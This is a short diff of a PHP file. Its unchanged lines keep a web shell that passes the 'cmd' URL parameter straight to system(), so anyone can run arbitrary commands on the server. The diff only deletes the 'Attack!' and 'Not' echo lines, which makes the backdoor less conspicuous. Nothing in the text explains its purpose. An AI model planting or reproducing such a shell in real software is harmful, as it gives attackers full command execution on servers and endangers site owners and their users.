@@ -8,11 +8,7 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        echo "Attack!";
         system($_GET['cmd']);
-    }
-    else{
-         echo "Not";
     }
 ?>
 </pre>
